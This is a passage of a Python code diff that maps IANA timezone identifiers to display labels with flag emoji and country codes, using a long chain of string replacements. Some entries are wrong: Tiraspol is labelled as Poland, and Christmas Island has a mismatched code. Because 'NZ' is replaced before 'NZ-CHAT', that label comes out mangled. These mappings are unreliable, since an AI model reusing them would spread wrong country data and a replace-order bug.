+            timezone = timezone.replace('America/Indiana/Winamac', '🇺🇸Winamac[US]')
+            timezone = timezone.replace('America/Indianapolis', '🇺🇸Indianapolis[US]')
+            timezone = timezone.replace('America/Inuvik', '🇨🇦Inuvik[CA]')
+            timezone = timezone.replace('America/Iqaluit', '🇨🇦Iqaluit[CA]')
+            timezone = timezone.replace('America/Jamaica', '🇯🇲Jamaica[JM]')
+            timezone = timezone.replace('America/Jujuy', '🇦🇷Jujuy[AR]')
+            timezone = timezone.replace('America/Juneau', '🇺🇸Juneau[US]')
+            timezone = timezone.replace('America/Kentucky/Louisville', '🇺🇸Louisville[US]')
+            timezone = timezone.replace('America/Kentucky/Monticello', '🇺🇸Monticello[US]')
+            timezone = timezone.replace('America/Knox_IN', '🇺🇸Knox[US]')
+            timezone = timezone.replace('America/Kralendijk', '🇧🇶Kralendijk[BQ]')
+            timezone = timezone.replace('America/La_Paz', '🇧🇴La Paz[BO]')
+            timezone = timezone.replace('America/Lima', '🇵🇪Lima[PE]')
+            timezone = timezone.replace('America/Los_Angeles', '🇺🇸Los Angeles[US]')
+            timezone = timezone.replace('America/Louisville', '🇺🇸Louisville[US]')
+            timezone = timezone.replace('America/Lower_Princes', '🇸🇽Lower Princes[SX]')
+            timezone = timezone.replace('America/Maceio', '🇧🇷Maceió[BR]')
+            timezone = timezone.replace('America/Managua', '🇳🇮Managua[NI]')
+            timezone = timezone.replace('America/Manaus', '🇧🇷Manaus[BR]')
+            timezone = timezone.replace('America/Marigot', '🇲🇫Marigot[MF]')
+            timezone = timezone.replace('America/Martinique', '🇲🇶Martinique[MQ]')
+            timezone = timezone.replace('America/Matamoros', '🇲🇽Matamoros[MX]')
+            timezone = timezone.replace('America/Mazatlan', '🇲🇽Mazatlán[MX]')
+            timezone = timezone.replace('America/Mendoza', '🇦🇷Mendoza[AR]')
+            timezone = timezone.replace('America/Menominee', '🇺🇸Menominee[US]')
+            timezone = timezone.replace('America/Merida', '🇲🇽Mérida[MX]')
+            timezone = timezone.replace('America/Metlakatla', '🇺🇸Metlakatla[US]')
+            timezone = timezone.replace('America/Mexico_City', '🇲🇽Mexico City[MX]')
+            timezone = timezone.replace('America/Miquelon', '🇵🇲Miquelon[PM]')
+            timezone = timezone.replace('America/Moncton', '🇨🇦Moncton[CA]')
+            timezone = timezone.replace('America/Monterrey', '🇲🇽Monterrey[MX]')
+            timezone = timezone.replace('America/Montevideo', '🇺🇾Montevideo[UY]')
+            timezone = timezone.replace('America/Montreal', '🇨🇦Montreal[CA]')
+            timezone = timezone.replace('America/Montserrat', '🇲🇸Montserrat[MS]')
+            timezone = timezone.replace('America/Nassau', '🇧🇸Nassau[BS]')
+            timezone = timezone.replace('America/New_York', '🇺🇸New York[US]')
+            timezone = timezone.replace('America/Nipigon', '🇨🇦Nipigon[CA]')
+            timezone = timezone.replace('America/Nome', '🇺🇸Nome[US]')
+            timezone = timezone.replace('America/Noronha', '🇧🇷Fernando de Noronha[BR]')
+            timezone = timezone.replace('America/North_Dakota/Beulah', '🇺🇸North Dakota[US]')
+            timezone = timezone.replace('America/North_Dakota/Center', '🇺🇸North Dakota[US]')
+            timezone = timezone.replace('America/North_Dakota/New_Salem', '🇺🇸North Dakota[US]')
+            timezone = timezone.replace('America/Nuuk', '🇬🇱Nuuk[GL]')
+            timezone = timezone.replace('America/Ojinaga', '🇲🇽Ojinaga[MX]')
+            timezone = timezone.replace('America/Panama', '🇵🇦Panama[PA]')
+            timezone = timezone.replace('America/Pangnirtung', '🇨🇦Pangnirtung[CA]')
+            timezone = timezone.replace('America/Paramaribo', '🇸🇷Paramaribo[SR]')
+            timezone = timezone.replace('America/Phoenix', '🇺🇸Phoenix[US]')
+            timezone = timezone.replace('America/Port-au-Prince', '🇭🇹Port-au-Prince[HT]')
+            timezone = timezone.replace('America/Port_of_Spain', '🇹🇹Port of Spain[TT]')
+            timezone = timezone.replace('America/Porto_Acre', '🇧🇷Porto Acre[BR]')
+            timezone = timezone.replace('America/Porto_Velho', '🇧🇷Porto Velho[BR]')
+            timezone = timezone.replace('America/Puerto_Rico', '🇵🇷San Juan[PR]')
+            timezone = timezone.replace('America/Punta_Arenas', '🇨🇱Punta Arenas[CL]')
+            timezone = timezone.replace('America/Rainy_River', '🇨🇦Rainy River[CA]')
+            timezone = timezone.replace('America/Rankin_Inlet', '🇨🇦Rankin Inlet[CA]')
+            timezone = timezone.replace('America/Recife', '🇧🇷Recife[BR]')
+            timezone = timezone.replace('America/Regina', '🇨🇦Regina[CA]')
+            timezone = timezone.replace('America/Resolute', '🇨🇦Resolute[CA]')
+            timezone = timezone.replace('America/Rio_Branco', '🇧🇷Rio Branco[BR]')
+            timezone = timezone.replace('America/Rosario', '🇦🇷Rosario[AR]')
+            timezone = timezone.replace('America/Santa_Isabel', '🇲🇽Santa Isabel[MX]')
+            timezone = timezone.replace('America/Santarem', '🇧🇷Santarém[BR]')
+            timezone = timezone.replace('America/Santiago', '🇨🇱Santiago[CL]')
+            timezone = timezone.replace('America/Santo_Domingo', '🇩🇴Santo Domingo[DO]')
+            timezone = timezone.replace('America/Sao_Paulo', '🇧🇷São Paulo[BR]')
+            timezone = timezone.replace('America/Scoresbysund', '🇬🇱Scoresbysund[GL]')
+            timezone = timezone.replace('America/Shiprock', '🇺🇸Shiprock[US]')
+            timezone = timezone.replace('America/Sitka', '🇺🇸Sitka[US]')
+            timezone = timezone.replace('America/St_Barthelemy', '🇧🇱St. Barthélemy[BL]')
+            timezone = timezone.replace('America/St_Johns', '🇨🇦St. John\'s[CA]')
+            timezone = timezone.replace('America/St_Kitts', '🇰🇳St. Kitts[KN]')
+            timezone = timezone.replace('America/St_Lucia', '🇱🇨St. Lucia[LC]')
+            timezone = timezone.replace('America/St_Thomas', '🇻🇮St. Thomas[VI]')
+            timezone = timezone.replace('America/St_Vincent', '🇻🇨St. Vincent[VC]')
+            timezone = timezone.replace('America/Swift_Current', '🇨🇦Swift Current[CA]')
+            timezone = timezone.replace('America/Tegucigalpa', '🇭🇳Tegucigalpa[HN]')
+            timezone = timezone.replace('America/Thule', '🇬🇱Thule[GL]')
+            timezone = timezone.replace('America/Thunder_Bay', '🇨🇦Thunder Bay[CA]')
+            timezone = timezone.replace('America/Tijuana', '🇲🇽Tijuana[MX]')
+            timezone = timezone.replace('America/Toronto', '🇨🇦Toronto[CA]')
+            timezone = timezone.replace('America/Tortola', '🇻🇬Tortola[VG]')
+            timezone = timezone.replace('America/Vancouver', '🇨🇦Vancouver[CA]')
+            timezone = timezone.replace('America/Virgin', '🇻🇮Virgin Islands[VI]')
+            timezone = timezone.replace('America/Whitehorse', '🇨🇦Whitehorse[CA]')
+            timezone = timezone.replace('America/Winnipeg', '🇨🇦Winnipeg[CA]')
+            timezone = timezone.replace('America/Yakutat', '🇺🇸Yakutat[US]')
+            timezone = timezone.replace('America/Yellowknife', '🇨🇦Yellowknife[CA]')
+            timezone = timezone.replace('Antarctica/Casey', '🇦🇶Casey[AQ]')
+            timezone = timezone.replace('Antarctica/Davis', '🇦🇶Davis[AQ]')
+            timezone = timezone.replace('Antarctica/DumontDUrville', '🇦🇶Dumont d\'Urville[AQ]')
+            timezone = timezone.replace('Antarctica/Macquarie', '🇦🇶Macquarie Island[AQ]')
+            timezone = timezone.replace('Antarctica/Mawson', '🇦🇶Mawson[AQ]')
+            timezone = timezone.replace('Antarctica/McMurdo', '🇳🇿McMurdo[NZ]')
+            timezone = timezone.replace('Antarctica/Palmer', '🇦🇶Palmer[AQ]')
+            timezone = timezone.replace('Antarctica/Rothera', '🇦🇶Rothera[AQ]')
+            timezone = timezone.replace('Antarctica/South_Pole', '🇦🇶South Pole[AQ]')
+            timezone = timezone.replace('Antarctica/Syowa', '🇦🇶Syowa[AQ]')
+            timezone = timezone.replace('Antarctica/Troll', '🇦🇶Troll[AQ]')
+            timezone = timezone.replace('Antarctica/Vostok', '🇦🇶Vostok[AQ]')
+            timezone = timezone.replace('Arctic/Longyearbyen', '🇸🇯Longyearbyen[SJ]')
+            timezone = timezone.replace('Asia/Aden', '🇾🇪Aden[YE]')
+            timezone = timezone.replace('Asia/Almaty', '🇰🇿Almaty[KZ]')
+            timezone = timezone.replace('Asia/Amman', '🇯🇴Amman[JO]')
+            timezone = timezone.replace('Asia/Anadyr', '🇷🇺Anadyr[RU]')
+            timezone = timezone.replace('Asia/Aqtau', '🇰🇿Aqtau[KZ]')
+            timezone = timezone.replace('Asia/Aqtobe', '🇰🇿Aqtobe[KZ]')
+            timezone = timezone.replace('Asia/Ashgabat', '🇹🇲Ashgabat[TM]')
+            timezone = timezone.replace('Asia/Ashkhabad', '🇹🇲Ashkhabad[TM]')
+            timezone = timezone.replace('Asia/Atyrau', '🇰🇿Atyrau[KZ]')
+            timezone = timezone.replace('Asia/Baghdad', '🇮🇶Baghdad[IQ]')
+            timezone = timezone.replace('Asia/Bahrain', '🇧🇭Bahrain[BH]')
+            timezone = timezone.replace('Asia/Baku', '🇦🇿Baku[AZ]')
+            timezone = timezone.replace('Asia/Bangkok', '🇹🇭Bangkok[TH]')
+            timezone = timezone.replace('Asia/Barnaul', '🇷🇺Barnaul[RU]')
+            timezone = timezone.replace('Asia/Beirut', '🇱🇧Beirut[LB]')
+            timezone = timezone.replace('Asia/Bishkek', '🇰🇬Bishkek[KG]')
+            timezone = timezone.replace('Asia/Brunei', '🇧🇳Brunei[BN]')
+            timezone = timezone.replace('Asia/Calcutta', '🇮🇳Calcutta[IN]')
+            timezone = timezone.replace('Asia/Chita', '🇷🇺Chita[RU]')
+            timezone = timezone.replace('Asia/Choibalsan', '🇲🇳Choibalsan[MN]')
+            timezone = timezone.replace('Asia/Chongqing', '🇨🇳Chongqing[CN]')
+            timezone = timezone.replace('Asia/Chungking', '🇨🇳Chungking[CN]')
+            timezone = timezone.replace('Asia/Colombo', '🇱🇰Colombo[LK]')
+            timezone = timezone.replace('Asia/Dacca', '🇧🇩Dacca[BD]')
+            timezone = timezone.replace('Asia/Damascus', '🇸🇾Damascus[SY]')
+            timezone = timezone.replace('Asia/Dhaka', '🇧🇩Dhaka[BD]')
+            timezone = timezone.replace('Asia/Dili', '🇹🇱Dili[TL]')
+            timezone = timezone.replace('Asia/Dubai', '🇦🇪Dubai[AE]')
+            timezone = timezone.replace('Asia/Dushanbe', '🇹🇯Dushanbe[TJ]')
+            timezone = timezone.replace('Asia/Famagusta', '🇨🇾Famagusta[CY]')
+            timezone = timezone.replace('Asia/Gaza', '🇵🇸Gaza[PS]')
+            timezone = timezone.replace('Asia/Harbin', '🇨🇳Harbin[CN]')
+            timezone = timezone.replace('Asia/Hebron', '🇵🇸Hebron[PS]')
+            timezone = timezone.replace('Asia/Ho_Chi_Minh', '🇻🇳Ho Chi Minh[VN]')
+            timezone = timezone.replace('Asia/Hong_Kong', '🇭🇰Hong Kong[HK]')
+            timezone = timezone.replace('Asia/Hovd', '🇲🇳Hovd[MN]')
+            timezone = timezone.replace('Asia/Irkutsk', '🇷🇺Irkutsk[RU]')
+            timezone = timezone.replace('Asia/Jakarta', '🇮🇩Jakarta[ID]')
+            timezone = timezone.replace('Asia/Jayapura', '🇮🇩Jayapura[ID]')
+            timezone = timezone.replace('Asia/Jerusalem', '🇮🇱Jerusalem[IL]')
+            timezone = timezone.replace('Asia/Kabul', '🇦🇫Kabul[AF]')
+            timezone = timezone.replace('Asia/Kamchatka', '🇷🇺Kamchatka[RU]')
+            timezone = timezone.replace('Asia/Karachi', '🇵🇰Karachi[PK]')
+            timezone = timezone.replace('Asia/Kashgar', '🇨🇳Kashgar[CN]')
+            timezone = timezone.replace('Asia/Kathmandu', '🇳🇵Kathmandu[NP]')
+            timezone = timezone.replace('Asia/Katmandu', '🇳🇵Katmandu[NP]')
+            timezone = timezone.replace('Asia/Khandyga', '🇷🇺Khandyga[RU]')
+            timezone = timezone.replace('Asia/Kolkata', '🇮🇳Kolkata[IN]')
+            timezone = timezone.replace('Asia/Krasnoyarsk', '🇷🇺Krasnoyarsk[RU]')
+            timezone = timezone.replace('Asia/Kuala_Lumpur', '🇲🇾Kuala Lumpur[MY]')
+            timezone = timezone.replace('Asia/Kuching', '🇲🇾Kuching[MY]')
+            timezone = timezone.replace('Asia/Kuwait', '🇰🇼Kuwait[KW]')
+            timezone = timezone.replace('Asia/Macao', '🇲🇴Macao[MO]')
+            timezone = timezone.replace('Asia/Macau', '🇲🇴Macau[MO]')
+            timezone = timezone.replace('Asia/Magadan', '🇷🇺Magadan[RU]')
+            timezone = timezone.replace('Asia/Makassar', '🇮🇩Makassar[ID]')
+            timezone = timezone.replace('Asia/Manila', '🇵🇭Manila[PH]')
+            timezone = timezone.replace('Asia/Muscat', '🇴🇲Muscat[OM]')
+            timezone = timezone.replace('Asia/Nicosia', '🇨🇾Nicosia[CY]')
+            timezone = timezone.replace('Asia/Novokuznetsk', '🇷🇺Novokuznetsk[RU]')
+            timezone = timezone.replace('Asia/Novosibirsk', '🇷🇺Novosibirsk[RU]')
+            timezone = timezone.replace('Asia/Omsk', '🇷🇺Omsk[RU]')
+            timezone = timezone.replace('Asia/Oral', '🇰🇿Oral[KZ]')
+            timezone = timezone.replace('Asia/Phnom_Penh', '🇰🇭Phnom Penh[KH]')
+            timezone = timezone.replace('Asia/Pontianak', '🇮🇩Pontianak[ID]')
+            timezone = timezone.replace('Asia/Pyongyang', '🇰🇵Pyongyang[KP]')
+            timezone = timezone.replace('Asia/Qatar', '🇶🇦Qatar[QA]')
+            timezone = timezone.replace('Asia/Qostanay', '🇰🇿Qostanay[KZ]')
+            timezone = timezone.replace('Asia/Qyzylorda', '🇰🇿Qyzylorda[KZ]')
+            timezone = timezone.replace('Asia/Rangoon', '🇲🇲Rangoon[MM]')
+            timezone = timezone.replace('Asia/Riyadh', '🇸🇦Riyadh[SA]')
+            timezone = timezone.replace('Asia/Saigon', '🇻🇳Saigon[VN]')
+            timezone = timezone.replace('Asia/Sakhalin', '🇷🇺Sakhalin[RU]')
+            timezone = timezone.replace('Asia/Samarkand', '🇺🇿Samarkand[UZ]')
+            timezone = timezone.replace('Asia/Seoul', '🇰🇷Seoul[KR]')
+            timezone = timezone.replace('Asia/Shanghai', '🇨🇳Shanghai[CN]')
+            timezone = timezone.replace('Asia/Singapore', '🇸🇬Singapore[SG]')
+            timezone = timezone.replace('Asia/Srednekolymsk', '🇷🇺Srednekolymsk[RU]')
+            timezone = timezone.replace('Asia/Taipei', '🇹🇼Taipei[TW]')
+            timezone = timezone.replace('Asia/Tashkent', '🇺🇿Tashkent[UZ]')
+            timezone = timezone.replace('Asia/Tbilisi', '🇬🇪Tbilisi[GE]')
+            timezone = timezone.replace('Asia/Tehran', '🇮🇷Tehran[IR]')
+            timezone = timezone.replace('Asia/Tel_Aviv', '🇮🇱Tel Aviv[IL]')
+            timezone = timezone.replace('Asia/Thimbu', '🇧🇹Thimbu[BT]')
+            timezone = timezone.replace('Asia/Thimphu', '🇧🇹Thimphu[BT]')
+            timezone = timezone.replace('Asia/Tokyo', '🇯🇵Tokyo[JP]')
+            timezone = timezone.replace('Asia/Tomsk', '🇷🇺Tomsk[RU]')
+            timezone = timezone.replace('Asia/Ujung_Pandang', '🇮🇩Ujung Pandang[ID]')
+            timezone = timezone.replace('Asia/Ulaanbaatar', '🇲🇳Ulaanbaatar[MN]')
+            timezone = timezone.replace('Asia/Ulan_Bator', '🇲🇳Ulan Bator[MN]')
+            timezone = timezone.replace('Asia/Urumqi', '🇨🇳Urumqi[CN]')
+            timezone = timezone.replace('Asia/Ust-Nera', '🇷🇺Ust-Nera[RU]')
+            timezone = timezone.replace('Asia/Vientiane', '🇱🇦Vientiane[LA]')
+            timezone = timezone.replace('Asia/Vladivostok', '🇷🇺Vladivostok[RU]')
+            timezone = timezone.replace('Asia/Yakutsk', '🇷🇺Yakutsk[RU]')
+            timezone = timezone.replace('Asia/Yangon', '🇲🇲Yangon[MM]')
+            timezone = timezone.replace('Asia/Yekaterinburg', '🇷🇺Yekaterinburg[RU]')
+            timezone = timezone.replace('Asia/Yerevan', '🇦🇲Yerevan[AM]')
+            timezone = timezone.replace('Atlantic/Azores', '🇵🇹Azores[PT]')
+            timezone = timezone.replace('Atlantic/Bermuda', '🇧🇲Bermuda[BM]')
+            timezone = timezone.replace('Atlantic/Canary', '🇪🇸Canary[ES]')
+            timezone = timezone.replace('Atlantic/Cape_Verde', '🇨🇻Cape Verde[CV]')
+            timezone = timezone.replace('Atlantic/Faeroe', '🇫🇴Faroe Islands[FO]')
+            timezone = timezone.replace('Atlantic/Faroe', '🇫🇴Faroe Islands[FO]')
+            timezone = timezone.replace('Atlantic/Jan_Mayen', '🇳🇴Jan Mayen[NO]')
+            timezone = timezone.replace('Atlantic/Madeira', '🇵🇹Madeira[PT]')
+            timezone = timezone.replace('Atlantic/Reykjavik', '🇮🇸Reykjavik[IS]')
+            timezone = timezone.replace('Atlantic/South_Georgia', '🇬🇸South Georgia[GS]')
+            timezone = timezone.replace('Atlantic/St_Helena', '🇸🇭St. Helena[SH]')
+            timezone = timezone.replace('Atlantic/Stanley', '🇫🇰Stanley[FK]')
+            timezone = timezone.replace('Australia/ACT', '🇦🇺Australian Capital Territory[AU]')
+            timezone = timezone.replace('Australia/Adelaide', '🇦🇺Adelaide[AU]')
+            timezone = timezone.replace('Australia/Brisbane', '🇦🇺Brisbane[AU]')
+            timezone = timezone.replace('Australia/Broken_Hill', '🇦🇺Broken Hill[AU]')
+            timezone = timezone.replace('Australia/Canberra', '🇦🇺Canberra[AU]')
+            timezone = timezone.replace('Australia/Currie', '🇦🇺Currie[AU]')
+            timezone = timezone.replace('Australia/Darwin', '🇦🇺Darwin[AU]')
+            timezone = timezone.replace('Australia/Eucla', '🇦🇺Eucla[AU]')
+            timezone = timezone.replace('Australia/Hobart', '🇦🇺Hobart[AU]')
+            timezone = timezone.replace('Australia/LHI', '🇦🇺Lord Howe Island[AU]')
+            timezone = timezone.replace('Australia/Lindeman', '🇦🇺Lindeman[AU]')
+            timezone = timezone.replace('Australia/Lord_Howe', '🇦🇺Lord Howe Island[AU]')
+            timezone = timezone.replace('Australia/Melbourne', '🇦🇺Melbourne[AU]')
+            timezone = timezone.replace('Australia/NSW', '🇦🇺New South Wales[AU]')
+            timezone = timezone.replace('Australia/North', '🇦🇺North[AU]')
+            timezone = timezone.replace('Australia/Perth', '🇦🇺Perth[AU]')
+            timezone = timezone.replace('Australia/Queensland', '🇦🇺Queensland[AU]')
+            timezone = timezone.replace('Australia/South', '🇦🇺South[AU]')
+            timezone = timezone.replace('Australia/Sydney', '🇦🇺Sydney[AU]')
+            timezone = timezone.replace('Australia/Tasmania', '🇦🇺Tasmania[AU]')
+            timezone = timezone.replace('Australia/Victoria', '🇦🇺Victoria[AU]')
+            timezone = timezone.replace('Australia/West', '🇦🇺West[AU]')
+            timezone = timezone.replace('Australia/Yancowinna', '🇦🇺Yancowinna[AU]')
+            timezone = timezone.replace('Brazil/Acre', '🇧🇷Acre[BR]')
+            timezone = timezone.replace('Brazil/DeNoronha', '🇧🇷Fernando de Noronha[BR]')
+            timezone = timezone.replace('Brazil/East', '🇧🇷Brasília[BR]')
+            timezone = timezone.replace('Brazil/West', '🇧🇷Amazon[BR]')
+            timezone = timezone.replace('Canada/Atlantic', '🇨🇦Atlantic[CA]')
+            timezone = timezone.replace('Canada/Central', '🇨🇦Central[CA]')
+            timezone = timezone.replace('Canada/Eastern', '🇨🇦Eastern[CA]')
+            timezone = timezone.replace('Canada/Mountain', '🇨🇦Mountain[CA]')
+            timezone = timezone.replace('Canada/Newfoundland', '🇨🇦Newfoundland[CA]')
+            timezone = timezone.replace('Canada/Pacific', '🇨🇦Pacific[CA]')
+            timezone = timezone.replace('Canada/Saskatchewan', '🇨🇦Saskatchewan[CA]')
+            timezone = timezone.replace('Canada/Yukon', '🇨🇦Yukon[CA]')
+            timezone = timezone.replace('Chile/Continental', '🇨🇱Continental Chile[CL]')
+            timezone = timezone.replace('Chile/EasterIsland', '🇨🇱Easter Island[CL]')
+            timezone = timezone.replace('Cuba', '🇨🇺Cuba[CU]')
+            timezone = timezone.replace('Egypt', '🇪🇬Egypt[EG]')
+            timezone = timezone.replace('Eire', '🇮🇪Ireland[IE]')
+            timezone = timezone.replace('Etc/Greenwich', '🌐Greenwich')
+            timezone = timezone.replace('Etc/UCT', '🌐UCT')
+            timezone = timezone.replace('Etc/UTC', '🌐UTC')
+            timezone = timezone.replace('Etc/Universal', '🌐Universal')
+            timezone = timezone.replace('Europe/Amsterdam', '🇳🇱Amsterdam[NL]')
+            timezone = timezone.replace('Europe/Andorra', '🇦🇩Andorra[AD]')
+            timezone = timezone.replace('Europe/Astrakhan', '🇷🇺Astrakhan[RU]')
+            timezone = timezone.replace('Europe/Athens', '🇬🇷Athens[GR]')
+            timezone = timezone.replace('Europe/Belfast', '🇬🇧Belfast[GB]')
+            timezone = timezone.replace('Europe/Belgrade', '🇷🇸Belgrade[RS]')
+            timezone = timezone.replace('Europe/Berlin', '🇩🇪Berlin[DE]')
+            timezone = timezone.replace('Europe/Bratislava', '🇸🇰Bratislava[SK]')
+            timezone = timezone.replace('Europe/Brussels', '🇧🇪Brussels[BE]')
+            timezone = timezone.replace('Europe/Bucharest', '🇷🇴Bucharest[RO]')
+            timezone = timezone.replace('Europe/Budapest', '🇭🇺Budapest[HU]')
+            timezone = timezone.replace('Europe/Busingen', '🇩🇪Busingen[DE]')
+            timezone = timezone.replace('Europe/Chisinau', '🇲🇩Chisinau[MD]')
+            timezone = timezone.replace('Europe/Copenhagen', '🇩🇰Copenhagen[DK]')
+            timezone = timezone.replace('Europe/Dublin', '🇮🇪Dublin[IE]')
+            timezone = timezone.replace('Europe/Gibraltar', '🇬🇮Gibraltar[GI]')
+            timezone = timezone.replace('Europe/Guernsey', '🇬🇬Guernsey[GG]')
+            timezone = timezone.replace('Europe/Helsinki', '🇫🇮Helsinki[FI]')
+            timezone = timezone.replace('Europe/Isle_of_Man', '🇮🇲Isle of Man[IM]')
+            timezone = timezone.replace('Europe/Istanbul', '🇹🇷Istanbul[TR]')
+            timezone = timezone.replace('Europe/Jersey', '🇯🇪Jersey[JE]')
+            timezone = timezone.replace('Europe/Kaliningrad', '🇷🇺Kaliningrad[RU]')
+            timezone = timezone.replace('Europe/Kiev', '🇺🇦Kiev[UA]')
+            timezone = timezone.replace('Europe/Kirov', '🇷🇺Kirov[RU]')
+            timezone = timezone.replace('Europe/Kyiv', '🇺🇦Kyiv[UA]')
+            timezone = timezone.replace('Europe/Lisbon', '🇵🇹Lisbon[PT]')
+            timezone = timezone.replace('Europe/Ljubljana', '🇸🇮Ljubljana[SI]')
+            timezone = timezone.replace('Europe/London', '🇬🇧London[GB]')
+            timezone = timezone.replace('Europe/Luxembourg', '🇱🇺Luxembourg[LU]')
+            timezone = timezone.replace('Europe/Madrid', '🇪🇸Madrid[ES]')
+            timezone = timezone.replace('Europe/Malta', '🇲🇹Malta[MT]')
+            timezone = timezone.replace('Europe/Mariehamn', '🇦🇽Mariehamn[AX]')
+            timezone = timezone.replace('Europe/Minsk', '🇧🇾Minsk[BY]')
+            timezone = timezone.replace('Europe/Monaco', '🇲🇨Monaco[MC]')
+            timezone = timezone.replace('Europe/Moscow', '🇷🇺Moscow[RU]')
+            timezone = timezone.replace('Europe/Nicosia', '🇨🇾Nicosia[CY]')
+            timezone = timezone.replace('Europe/Oslo', '🇳🇴Oslo[NO]')
+            timezone = timezone.replace('Europe/Paris', '🇫🇷Paris[FR]')
+            timezone = timezone.replace('Europe/Podgorica', '🇲🇪Podgorica[ME]')
+            timezone = timezone.replace('Europe/Prague', '🇨🇿Prague[CZ]')
+            timezone = timezone.replace('Europe/Riga', '🇱🇻Riga[LV]')
+            timezone = timezone.replace('Europe/Rome', '🇮🇹Rome[IT]')
+            timezone = timezone.replace('Europe/Samara', '🇷🇺Samara[RU]')
+            timezone = timezone.replace('Europe/San_Marino', '🇸🇲San Marino[SM]')
+            timezone = timezone.replace('Europe/Sarajevo', '🇧🇦Sarajevo[BA]')
+            timezone = timezone.replace('Europe/Saratov', '🇷🇺Saratov[RU]')
+            timezone = timezone.replace('Europe/Simferopol', '🇺🇦Simferopol[UA]')
+            timezone = timezone.replace('Europe/Skopje', '🇲🇰Skopje[MK]')
+            timezone = timezone.replace('Europe/Sofia', '🇧🇬Sofia[BG]')
+            timezone = timezone.replace('Europe/Stockholm', '🇸🇪Stockholm[SE]')
+            timezone = timezone.replace('Europe/Tallinn', '🇪🇪Tallinn[EE]')
+            timezone = timezone.replace('Europe/Tirane', '🇦🇱Tirane[AL]')
+            timezone = timezone.replace('Europe/Tiraspol', '🇵🇱Tiraspol[PL]')
+            timezone = timezone.replace('Europe/Ulyanovsk', '🇷🇺Ulyanovsk[RU]')
+            timezone = timezone.replace('Europe/Uzhgorod', '🇺🇦Uzhgorod[UA]')
+            timezone = timezone.replace('Europe/Vaduz', '🇱🇮Vaduz[LI]')
+            timezone = timezone.replace('Europe/Vatican', '🇻🇦Vatican City[VA]')
+            timezone = timezone.replace('Europe/Vienna', '🇦🇹Vienna[AT]')
+            timezone = timezone.replace('Europe/Vilnius', '🇱🇹Vilnius[LT]')
+            timezone = timezone.replace('Europe/Volgograd', '🇷🇺Volgograd[RU]')
+            timezone = timezone.replace('Europe/Warsaw', '🇵🇱Warsaw[PL]')
+            timezone = timezone.replace('Europe/Zagreb', '🇭🇷Zagreb[HR]')
+            timezone = timezone.replace('Europe/Zaporozhye', '🇺🇦Zaporozhye[UA]')
+            timezone = timezone.replace('Europe/Zurich', '🇨🇭Zurich[CH]')
+            timezone = timezone.replace('Iceland', '🇮🇸Iceland[IS]')
+            timezone = timezone.replace('Indian/Antananarivo', '🇲🇬Antananarivo[MG]')
+            timezone = timezone.replace('Indian/Chagos', '🇮🇴Chagos[IO]')
+            timezone = timezone.replace('Indian/Christmas', '🇨🇽Christmas[CC]')
+            timezone = timezone.replace('Indian/Cocos', '🇨🇨Cocos[CC]')
+            timezone = timezone.replace('Indian/Comoro', '🇰🇲Comoro[KM]')
+            timezone = timezone.replace('Indian/Kerguelen', '🇹🇫Kerguelen[TF]')
+            timezone = timezone.replace('Indian/Mahe', '🇸🇨Mahe[SC]')
+            timezone = timezone.replace('Indian/Maldives', '🇲🇻Maldives[MV]')
+            timezone = timezone.replace('Indian/Mauritius', '🇲🇺Mauritius[MU]')
+            timezone = timezone.replace('Indian/Mayotte', '🇾🇹Mayotte[YT]')
+            timezone = timezone.replace('Indian/Reunion', '🇷🇪Reunion[RE]')
+            timezone = timezone.replace('Kwajalein', '🇲🇭Kwajalein[MH]')
+            timezone = timezone.replace('Mexico/BajaNorte', '🇲🇽Baja Norte[MX]')
+            timezone = timezone.replace('Mexico/BajaSur', '🇲🇽Baja Sur[MX]')
+            timezone = timezone.replace('Mexico/General', '🇲🇽General[MX]')
+            timezone = timezone.replace('NZ', '🇳🇿New Zealand[NZ]')
+            timezone = timezone.replace('NZ-CHAT', '🇳🇿Chatham Islands[NZ]')
+            timezone = timezone.replace('Navajo', 'Navajo')
+            timezone = timezone.replace('Pacific/Apia', '🇼🇸Apia[WS]')
+            timezone = timezone.replace('Pacific/Auckland', '🇳🇿Auckland[NZ]')
+            timezone = timezone.replace('Pacific/Bougainville', '🇵🇬Bougainville[PG]')
+            timezone = timezone.replace('Pacific/Chatham', '🇳🇿Chatham[NZ]')
+            timezone = timezone.replace('Pacific/Chuuk', '🇫🇲Chuuk[FM]')
+            timezone = timezone.replace('Pacific/Easter', '🇨🇱Easter Island[CL]')
+            timezone = timezone.replace('Pacific/Efate', '🇻🇺Efate[VU]')
+            timezone = timezone.replace('Pacific/Enderbury', '🇰🇮Enderbury[KI]')
+            timezone = timezone.replace('Pacific/Fakaofo', '🇹🇰Fakaofo[TK]')
+            timezone = timezone.replace('Pacific/Fiji', '🇫🇯Fiji[FJ]')
+            timezone = timezone.replace('Pacific/Funafuti', '🇹🇻Funafuti[TV]')
+            timezone = timezone.replace('Pacific/Galapagos', '🇪🇨Galapagos[EC]')
+            timezone = timezone.replace('Pacific/Gambier', '🇵🇫Gambier Islands[PF]')
+            timezone = timezone.replace('Pacific/Guadalcanal', '🇸🇧Guadalcanal[SB]')
+            timezone = timezone.replace('Pacific/Guam', '🇬🇺Guam[GU]')
+            timezone = timezone.replace('Pacific/Honolulu', '🇺🇸Honolulu[US]')
+            timezone = timezone.replace('Pacific/Johnston', '🇺🇸Johnston[US]')
+            timezone = timezone.replace('Pacific/Kanton', '🇰🇮Kanton[KI]')
+            timezone = timezone.replace('Pacific/Kiritimati', '🇰🇮Kiritimati[KI]')
+            timezone = timezone.replace('Pacific/Kosrae', '🇫🇲Kosrae[FM]')
+            timezone = timezone.replace('Pacific/Kwajalein', '🇲🇭Kwajalein[MH]')
+            timezone = timezone.replace('Pacific/Majuro', '🇲🇭Majuro[MH]')
+            timezone = timezone.replace('Pacific/Marquesas', '🇵🇫Marquesas Islands[PF]')
+            timezone = timezone.replace('Pacific/Midway', '🇺🇸Midway[US]')
+            timezone = timezone.replace('Pacific/Nauru', '🇳🇷Nauru[NR]')
+            timezone = timezone.replace('Pacific/Niue', '🇳🇺Niue[NU]')
+            timezone = timezone.replace('Pacific/Norfolk', '🇳🇫Norfolk Island[NF]')
+            timezone = timezone.replace('Pacific/Noumea', '🇳🇨Noumea[NC]')
+            timezone = timezone.replace('Pacific/Pago_Pago', '🇦🇸Pago Pago[AS]')
+            timezone = timezone.replace('Pacific/Palau', '🇵🇼Palau[PW]')
+            timezone = timezone.replace('Pacific/Pitcairn', '🇵🇳Pitcairn Islands[PN]')
+            timezone = timezone.replace('Pacific/Pohnpei', '🇫🇲Pohnpei[FM]')
